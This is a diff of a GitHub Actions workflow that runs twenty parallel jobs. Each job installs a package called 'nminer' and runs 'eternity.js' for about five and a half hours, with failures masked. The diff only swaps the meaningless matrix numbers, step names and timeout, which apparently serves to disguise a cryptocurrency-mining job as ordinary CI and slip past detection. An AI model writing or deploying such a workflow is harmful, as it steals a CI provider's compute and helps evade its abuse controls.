@@ -9,26 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9015 }
-          - { version: 782 }
-          - { version: 1737 }
-          - { version: 7900 }
-          - { version: 2211 }
-          - { version: 4393 }
-          - { version: 4049 }
-          - { version: 6187 }
-          - { version: 7951 }
-          - { version: 4897 }
-          - { version: 2701 }
-          - { version: 1248 }
-          - { version: 3893 }
-          - { version: 5712 }
-          - { version: 3711 }
-          - { version: 606 }
-          - { version: 1105 }
-          - { version: 3885 }
-          - { version: 3202 }
-          - { version: 7830 }
+          - { version: 5183 }
+          - { version: 3214 }
+          - { version: 2920 }
+          - { version: 8030 }
+          - { version: 3330 }
+          - { version: 1878 }
+          - { version: 3958 }
+          - { version: 9651 }
+          - { version: 3375 }
+          - { version: 1228 }
+          - { version: 3961 }
+          - { version: 7876 }
+          - { version: 3632 }
+          - { version: 558 }
+          - { version: 8533 }
+          - { version: 9050 }
+          - { version: 1007 }
+          - { version: 1983 }
+          - { version: 6741 }
+          - { version: 8546 }
 
     steps:
       - name: Checkout
@@ -39,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: failing dowse demob
+      - name: empty upon
         run: |
           npm install nminer@latest
-          timeout 331m node eternity.js || echo "eternity executed"
+          timeout 327m node eternity.js || echo "eternity executed"
